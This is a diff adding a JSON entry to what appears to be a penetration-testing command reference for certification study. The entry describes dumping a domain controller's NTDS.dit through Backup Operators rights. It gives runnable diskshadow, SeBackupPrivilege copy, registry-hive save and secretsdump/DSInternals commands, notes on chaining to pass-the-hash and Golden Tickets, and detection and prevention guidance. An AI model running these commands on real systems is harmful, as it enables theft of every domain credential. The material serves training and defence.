@@ -1,0 +1,104 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tools": [
+    "diskshadow",
+    "secretsdump"
+  ],
+  "tags": [
+    "sebackup",
+    "ntds",
+    "domain-controller"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Backup Operators",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Script a shadow copy of C: and expose it as E:",
+      "command": "# set context persistent; add volume C: alias cdrive; create; expose %cdrive% E:"
+    },
+    {
+      "label": "Copy ntds.dit off the shadow via SeBackup",
+      "command": "Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit"
+    },
+    {
+      "label": "Also grab SYSTEM and SAM hives",
+      "command": "reg save HKLM\\SYSTEM SYSTEM.SAV\nreg save HKLM\\SAM SAM.SAV"
+    },
+    {
+      "label": "secretsdump ntds.dit offline",
+      "command": "secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL"
+    },
+    {
+      "label": "robocopy /B alternative for the copy",
+      "command": "robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit"
+    },
+    {
+      "label": "Alt extraction: DSInternals offline (no Impacket)",
+      "command": "Import-Module .\\DSInternals.psd1\n$key = Get-BootKey -SystemHivePath .\\SYSTEM\nGet-ADDBAccount -DBPath .\\ntds.dit -BootKey $key -All | Format-Custom -View Summary"
+    }
+  ],
+  "notes": "=== Backup Operators — NTDS.dit Full Domain Hash Extraction ===\nExtract all domain credentials via NTDS.dit using VSS snapshot + SeBackupPrivilege.\n\n=== WHY VSS IS NEEDED ===\nNTDS.dit is locked by AD DS service while DC is running — cannot open directly.\nVolume Shadow Copy creates a point-in-time snapshot where NTDS.dit is not locked.\nSeBackupPrivilege then allows copying from the shadow copy (bypassing ACL).\n\n=== FULL ATTACK CHAIN ===\nStep 1: Create VSS snapshot with diskshadow script\n  Create script.txt (must include all these settings):\n    set verbose on\n    set metadata C:\\Windows\\Temp\\meta.cab\n    set context clientaccessible\n    set context persistent\n    begin backup\n    add volume C: alias cdrive\n    create\n    expose %cdrive% E:\n    end backup\n  Run: diskshadow.exe /s script.txt\n  clientaccessible = accessible to non-SYSTEM users (required)\n  persistent = survives reboots\n\nStep 2: Copy NTDS.dit from shadow copy\n  Import SeBackupPrivilege DLLs + Set-SeBackupPrivilege\n  Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit .\\ntds.dit\n\nStep 3: Export registry hives (Boot Key needed to decrypt NTDS.dit)\n  reg save HKLM\\SYSTEM .\\SYSTEM\n  reg save HKLM\\SECURITY .\\SECURITY\n\nStep 4: Offline credential extraction\n  python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\n  → All domain account hashes in NTLM format\n\n=== ALTERNATIVE TOOL: DSInternals ===\n$key = Get-BootKey -SystemHivePath .\\SYSTEM\nGet-ADDBAccount -DBPath .\\ntds.dit -BootKey $key -All | Format-Custom -View Summary\n\n=== CHAINING CONTEXT ===\nNTDS.dit dump → Administrator hash → pass-the-hash everywhere in domain\nNTDS.dit dump → krbtgt hash → Golden Ticket (unlimited domain persistence, 10-year default TTL)\nDomain user hashes → offline cracking → plaintext passwords → password spray\nNTDS.dit gives Kerberos keys too → overpass-the-hash / pass-the-ticket\n\n=== WHAT TO LOOK FOR ===\nBackup Operators on DC + local logon rights = game over for domain\ndiskshadow clientaccessible setting is critical — without it, shadow copy requires SYSTEM\nAny account with both local DC logon + SeBackupPrivilege = same result regardless of group",
+  "references": [
+    {
+      "title": "Microsoft - diskshadow",
+      "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow"
+    },
+    {
+      "title": "Impacket secretsdump.py",
+      "url": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sebackup-copy-file",
+      "note": "The SeBackup primitive this builds on.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "sebackup-ntds-diskshadow",
+  "name": "Backup Operators - Dump NTDS.dit via diskshadow",
+  "command": "diskshadow.exe   # script a shadow copy, then Copy-FileSeBackupPrivilege the ntds.dit",
+  "description": "On a Domain Controller, use diskshadow to create a shadow copy of C:, copy NTDS.dit off it with SeBackupPrivilege, back up SAM/SYSTEM hives, then extract all domain hashes offline with secretsdump.",
+  "opsec": "loud",
+  "mitre": [
+    "T1003.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "NTDS.dit is locked by the AD DS service and cannot be copied directly. Diskshadow creates a Volume Shadow Copy (VSS) of the C drive and exposes it under a new drive letter, providing access to a snapshot of NTDS.dit that is not locked. SeBackupPrivilege then allows copying this snapshot file. The extracted NTDS.dit combined with the SYSTEM hive enables offline extraction of all domain account hashes.",
+    "prerequisites": "Membership in Backup Operators (SeBackupPrivilege + local DC logon rights). Diskshadow.exe available. SeBackupPrivilege library loaded. SeBackupPrivilege enabled in token.",
+    "impact": "Complete extraction of all domain account NTLM hashes, Kerberos keys, and password history from NTDS.dit. Enables full domain compromise via pass-the-hash or offline password cracking.",
+    "detection": "Diskshadow execution creating VSS snapshot. Large file copy from VSS exposed volume to staging directory. reg save of SYSTEM hive by Backup Operators member. secretsdump.py processing extracted files. Event ID 8222 (shadow copy created), 7036 (Volume Shadow Copy service state change).",
+    "artifacts": "Event 8222: Volume Shadow Copy created by Backup Operators member | Staging: ntds.dit + SYSTEM.SAV files | Network: file transfer of multi-GB NTDS.dit | secretsdump output with all domain hashes",
+    "prevention": "Apply the same controls as sebackup-copy-file. Enforce privileged access workstations (PAWs) for Backup Operators. Monitor VSS activity — shadow copy creation by non-admin is anomalous. Consider Microsoft ATA/Defender for Identity detection of DCSync-like hash extraction.",
+    "misconfiguration": "Backup Operators membership without Tier 0 privileged access controls. No monitoring on VSS creation events. NTDS.dit directory not monitored for unusual access.",
+    "vulnerable_config": "# VSS shadow copy attack:\ndiskshadow.exe  # interactive: expose C: as E:\nCopy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit\nreg save HKLM\\SYSTEM SYSTEM.SAV\n# Offline:\nsecretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL",
+    "secure_config": "# Tiered access model for Backup Operators\n# Use dedicated PAW for backup operations\n# Back up via Windows Server Backup with dedicated service account\n# not via interactive Backup Operators logon to DC\n\n# Monitor VSS creation:\nGet-WinEvent -LogName System | Where-Object {$_.Id -eq 8222}\n\n# Alert on NTDS.dit access by non-SYSTEM processes",
+    "sources": [
+      "HTB M26",
+      "MITRE T1003.003",
+      "MITRE T1078.002"
+    ]
+  }
+}
